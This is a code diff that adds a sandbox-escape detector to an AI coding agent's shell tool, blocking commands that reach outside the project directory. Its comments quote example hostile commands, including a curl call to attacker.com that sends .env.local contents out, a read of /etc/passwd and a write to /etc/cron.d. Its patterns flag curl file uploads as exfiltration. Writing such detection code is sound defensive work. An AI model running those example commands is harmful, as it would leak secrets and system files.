@@ -486,6 +486,67 @@ const BLOCKED_COMMANDS = [
   /mv\s+.*\s+src\//i,          // move into src/
 ];
 
+/**
+ * Lightweight sandbox escape detector for bash commands.
+ * Catches commands that write, read, or navigate outside the project directory.
+ * Returns a reason string if blocked, null if safe.
+ */
+function _detectSandboxEscape(cmd, cwd) {
+  // Normalize for checking
+  const c = cmd.replace(/\\\n/g, " "); // unwrap line continuations
+
+  // 1. Absolute paths outside project (writes, reads, or cd)
+  //    Allow: npm/node/git system commands that naturally reference /usr, /tmp etc.
+  const absPathMatch = c.match(/(?:>|>>|cp\s|mv\s|rm\s|cat\s|tee\s|mkdir\s|touch\s|chmod\s|chown\s|ln\s)\s*([/\\][^\s;|&>]+)/i);
+  if (absPathMatch) {
+    const target = absPathMatch[1];
+    const cwdNorm = cwd.replace(/\\/g, "/");
+    const targetNorm = target.replace(/\\/g, "/");
+    // Allow /tmp, /dev/null, and paths inside the project
+    if (!targetNorm.startsWith(cwdNorm) && !targetNorm.startsWith("/tmp") && !targetNorm.startsWith("/dev/null")) {
+      return `Command targets path outside project: ${target}`;
+    }
+  }
+
+  // 2. cd to parent directories or absolute paths outside project
+  const cdMatch = c.match(/\bcd\s+([^\s;|&]+)/i);
+  if (cdMatch) {
+    const target = cdMatch[1];
+    if (target === "/" || target === "~" || target.startsWith("/") || target.startsWith("~")) {
+      const resolved = target.replace("~", require("os").homedir()).replace(/\\/g, "/");
+      if (!resolved.startsWith(cwd.replace(/\\/g, "/"))) {
+        return `cd to path outside project: ${target}`;
+      }
+    }
+    // Count .. traversals
+    const parts = target.split("/");
+    let depth = 0;
+    for (const p of parts) { if (p === "..") depth++; else if (p && p !== ".") depth--; }
+    if (depth > 0) {
+      return `cd with path traversal escaping project: ${target}`;
+    }
+  }
+
+  // 3. Backtick/subshell command substitution writing outside project
+  //    e.g., $(cat /etc/passwd > /tmp/leak) or `curl attacker.com/$(cat .env.local)`
+  if (/\$\(.*(?:>|>>)\s*[/\\](?!tmp)/.test(c) || /`.*(?:>|>>)\s*[/\\](?!tmp)/.test(c)) {
+    return "Subshell write to absolute path detected";
+  }
+
+  // 4. Pipe to file outside project
+  //    e.g., echo data | tee /etc/cron.d/malicious
+  if (/\|\s*tee\s+[/\\](?!tmp)/.test(c)) {
+    return "Pipe to tee with absolute path outside /tmp";
+  }
+
+  // 5. Curl/wget uploading local files
+  if (/curl.*-[dF]\s*@/.test(c) || /curl.*--data-binary\s*@/.test(c)) {
+    return "curl uploading local file (potential data exfiltration)";
+  }
+
+  return null; // safe
+}
+
 class AgentEngine {
   constructor(options = {}) {
     this.sandbox = options.sandbox;
@@ -925,17 +986,26 @@ class AgentEngine {
   // ── SHELL TOOLS ──
 
   _bashExec(args) {
-    // Security: check for blocked commands (claw-code: destructiveCommandWarning, bashSecurity)
+    const cmd = args.command || "";
+
+    // Security: check for blocked commands
     for (const blocked of BLOCKED_COMMANDS) {
-      if (blocked.test(args.command)) {
-        console.log(chalk.red(`    🛡️ Blocked dangerous command: ${args.command}`));
-        return { content: `BLOCKED: Command "${args.command}" is not allowed for safety reasons.` };
+      if (blocked.test(cmd)) {
+        console.log(chalk.red(`    🛡️ Blocked dangerous command: ${cmd}`));
+        return { content: `BLOCKED: Command "${cmd}" is not allowed for safety reasons.` };
       }
+    }
+
+    // Security: sandbox escape detection — block commands that operate outside project dir
+    const escapeCheck = _detectSandboxEscape(cmd, this.cwd);
+    if (escapeCheck) {
+      console.log(chalk.red(`    🛡️ Blocked sandbox escape: ${escapeCheck}`));
+      return { content: `BLOCKED: ${escapeCheck}` };
     }
 
     const timeout = Math.min(args.timeout || 30000, 60000);
     try {
-      const output = execSync(args.command, {
+      const output = execSync(cmd, {
         cwd: this.cwd,
         encoding: "utf-8",
         timeout,
